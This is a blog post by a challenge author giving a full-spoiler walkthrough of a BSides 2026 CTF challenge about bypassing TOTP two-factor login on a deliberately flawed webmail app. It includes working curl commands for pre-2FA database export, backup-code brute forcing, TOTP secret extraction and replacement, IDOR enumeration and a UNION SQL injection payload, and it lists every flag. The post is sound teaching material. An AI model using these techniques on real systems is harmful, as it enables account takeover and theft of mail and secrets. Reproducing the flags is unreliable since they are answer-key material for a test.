---
Title: BSides 2026 CTF: Challenge 3 - Webmail Access
Date: 2026-03-12T13:00:00+10:00
Tags: ctf, cybersecurity, bsides2026, cryptography, bsides
Author: dmoges
AuthorURL: https://dmoges.com
Category: dmoges
Status: published
Cover: /images/placeholder.jpg
---

I wanted this challenge to show that two-factor authentication isn't a silver bullet. Trevor Blackwood's webmail is protected by TOTP-based 2FA, but the implementation has multiple flaws that let you bypass it entirely.

## Challenge Details

**Difficulty**: Medium-Hard

**Category**: Email Security / Cryptography

## The Setup

From Challenge 2, you've got Trevor's email credentials (`t.blackwood@ballaratengineeringsupplies.com` / `Warehouse2024!`). But when you try to log in to the webmail system, you hit a 2FA prompt. The webmail is a Roundcube-inspired interface backed by Node.js and SQLite.

**This post contains full spoilers including flags and solutions.** If you want to try the challenges yourself first, the challenge environments are available in the [BSides Ballarat CTF git repo](https://github.com/bsides-ballarat/CTF2026-overview).

## Multiple Ways In

There are several paths through this challenge. You don't need all of them - any one path gets you into the inbox. I'll cover the four main approaches, then the individual flags.

### Path A: Database Exfiltration (Intended Path)

The webmail has an export/download endpoint that only checks if you have a temporary session (i.e. you've entered the password) but doesn't verify you've completed 2FA. This means you can download the entire database before finishing login.

```bash
# Step 1: Login to get a temporary session cookie
curl -c cookies.txt -X POST "http://localhost:8084/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"t.blackwood","password":"Warehouse2024!"}'

# Step 2: Download the database (doesn't need 2FA!)
curl -b cookies.txt -o webmail.db \
  "http://localhost:8084/api/export?filename=webmail.db"

# Step 3: Verify and explore
file webmail.db  # SQLite 3.x database
sqlite3 webmail.db ".tables"  # contacts, emails, sessions, users
```

Now you have everything - user accounts, TOTP secrets, emails, backup codes. The 2FA is completely bypassed because the export endpoint has weaker auth checks than the rest of the app.

**How you'd know to try this**: After logging in with the password, you get redirected to the 2FA page. But you're already partially authenticated. Exploring what endpoints work with just the session cookie (before 2FA) is a natural next step. Try common paths like `/api/export`, `/api/backup`, `/api/download`.

### Path B: Brute Force Backup Codes (Pattern Recognition)

If you look at the 2FA page's error messages, or if you've got the database from Path A, you'll notice the backup codes follow a pattern: `BACKUP-7429-[A-E][1-4]`.

That `7429` is Trevor's badge number from Challenge 2. There are only 20 possible combinations (5 letters x 4 numbers), so brute-forcing is trivial:

```bash
# After initial login, try backup codes
for letter in A B C D E; do
  for num in 1 2 3 4; do
    CODE="BACKUP-7429-${letter}${num}"
    RESULT=$(curl -s -X POST "http://localhost:8084/api/auth/verify-2fa" \
      -H "Content-Type: application/json" \
      -b cookies.txt \
      -d "{\"code\":\"$CODE\"}")
    echo "$CODE: $RESULT"
  done
done
```

**How you'd know to try this**: If you spotted the badge code `7429#` in Challenge 2 and see `BACKUP-7429-` in the database or in error message hints, the pattern clicks. Even without that connection, 20 combinations is easy to brute-force.

### Path C: TOTP Secret Extraction (Advanced)

From the exfiltrated database, you can extract Trevor's actual TOTP secret and generate valid codes yourself:

```bash
sqlite3 webmail.db "SELECT totp_secret FROM users WHERE username='t.blackwood';"
# Output: JBSWY3DPEHPK3PXP
```

Then generate a valid code:

```python
import pyotp
totp = pyotp.TOTP('JBSWY3DPEHPK3PXP')
print(totp.now())  # e.g., 487329 (changes every 30 seconds)
```

You can even replace the secret with your own and add it to Google Authenticator:

```bash
NEW_SECRET=$(python3 -c "import pyotp; print(pyotp.random_base32())")
sqlite3 webmail.db "UPDATE users SET totp_secret='$NEW_SECRET' WHERE username='t.blackwood';"
# Now your authenticator app generates valid codes for Trevor's account
```

**How you'd know to try this**: Once you have the database, `totp_secret` is right there in the users table. If you know how TOTP works (RFC 6238), you know that having the secret means you can generate codes. The `pyotp` library makes this trivial.

### Path D: IDOR Email Access (Skip Authentication Entirely)

You can actually read Trevor's emails without fully authenticating as him at all. The email endpoint uses sequential integer IDs with no authorisation check:

```bash
# Create your own account, or use any authenticated session
for id in {1..20}; do
  curl -s -b cookies.txt "http://localhost:8084/api/emails/$id" | jq '{id: .email.id, to: .email.to_email, subject: .email.subject}'
done
```

**How you'd know to try this**: After accessing your own emails, notice the URLs use numeric IDs like `/api/emails/15`. The natural test is to try `/api/emails/1` and see if you get someone else's mail. IDOR is consistently #1 on the OWASP Top 10 for a reason.

## The Flags

### Easy Tier (100 points)

**Flag 1 - Password Reset Enumeration (50 pts)**: `BSides2026{password_reset_enumeration}`

The password reset page behaves differently for valid vs. invalid accounts - valid emails get "Reset link sent", invalid ones get "Account not found". The flag appears in the response.

```bash
curl -X POST "http://localhost:8084/api/auth/reset-request" \
  -H "Content-Type: application/json" \
  -d '{"email":"t.blackwood@ballaratengineeringsupplies.com"}'
```

**How you'd know**: Check the "Forgot Password?" link. It's standard practice to test whether the system leaks information about which accounts exist.

**Flag 2 - Session Fixation (50 pts)**: `BSides2026{session_fixation_vulnerability}`

After entering the password, you're redirected to `/verify-2fa?session=temp_abc123...`. The session ID is right there in the URL - visible in browser history, server logs, and Referer headers. Check the page source for the flag in an HTML comment.

**How you'd know**: Any time you see a session ID in a URL parameter rather than a cookie, that's a session fixation vulnerability. View source is a reflex for CTF players.

### Medium Tier (250 points)

**Flag 3 - SQLite Database Exfiltration (100 pts)**: `BSides2026{sqlite_database_exfiltration}`

Download the database via the export endpoint as described in Path A above.

**Flag 4 - Predictable Backup Codes (75 pts)**: `BSides2026{backup_codes_predictable}`

Brute-force the backup codes as described in Path B. The badge code `7429` from Challenge 2 is the key to recognising the pattern.

**Flag 5 - Trevor's Inbox Compromised (75 pts)**: `BSides2026{trevors_inbox_compromised}`

Successfully access Trevor's inbox using any of the paths above. The flag appears in one of the email subjects.

### Hard Tier (300 points)

**Flag 6 - TOTP Secret Extraction (150 pts)**: `BSides2026{totp_secret_extraction_mastery}`

Extract the TOTP secret from the database and generate a valid code (Path C). This flag only appears when you authenticate with a real TOTP code, not a backup code - the server can tell the difference.

**Flag 7 - Email Search SQL Injection (100 pts)**: `BSides2026{email_search_sqli_union}`

The inbox search function concatenates input directly into SQL. Close the existing query and inject a UNION:

```bash
curl -b cookies.txt \
  "http://localhost:8084/api/emails/search" \
  --data-urlencode "q=') UNION SELECT 1,2,3,4,5,6--"
```

The `')` closes the LIKE clause and parenthesis, then UNION appends your query. You can use this to extract any table in the database.

**How you'd know**: After getting inbox access, test the search feature with a single quote. If you get a SQL error, you've got injection. UNION-based extraction is the standard next step.

**Flag 8 - IDOR Cross-User Email Access (50 pts)**: `BSides2026{idor_cross_user_email_access}`

Access other users' emails by changing the ID in the request (Path D). The flag is in one of Margaret Chen's emails.

## What's in Trevor's Inbox

The real payload of this challenge is the intelligence in Trevor's emails:

**Email 1 - IRC Credentials:**
- IRC Server: irc.underground-miners.com
- Port: 6697 (SSL)
- Channel: #coordination
- Trevor's IRC nick: warehouse_t
- Mentions an AI bot called "BitHelper"

**Email 2 - Self-Destruct Component:**
- Contains `SD_SEQUENCE_SEVEN` - the number component of the override code
- Warns that the facility is "rigged with insurance measures"
- References the `DIAGNOSTIC-FULL` command for the override system

**Email 3 - Physical Access:**
- Badge code: 7429#
- Basement storage room location
- Tunnel access details

These emails set up Challenge 4 (IRC access) and provide critical intelligence for Challenge 5 (the self-destruct finale).

## Real-World Relevance

2FA bypass is a real and growing category of attacks. The techniques in this challenge map to actual vulnerabilities:

- **Database exfiltration**: If an attacker can access the auth database, 2FA secrets stored in plaintext are useless
- **Backup code prediction**: Many systems generate backup codes with insufficient randomness
- **IDOR**: Broken access control is consistently #1 on the OWASP Top 10

The lesson is that 2FA is only as strong as its implementation. Storing TOTP secrets in a SQLite database that's accessible via path traversal defeats the entire purpose.

## My thoughts

This was probably the most technically challenging to build and to solve. Getting the TOTP implementation right - and then deliberately making it wrong in specific ways - required a solid understanding of how RFC 6238 works.

The backup code pattern was a deliberate callback to the badge code from Challenge 2. I wanted teams who paid attention to details across challenges to be rewarded. If you noticed the `7429#` badge code and then saw `BACKUP-7429-` in the backup code format, you could skip a lot of work.

The path traversal to database download is the kind of vulnerability that seems too easy, but it's exactly how real breaches happen. Why bother cracking 2FA when you can just download the database with all the secrets?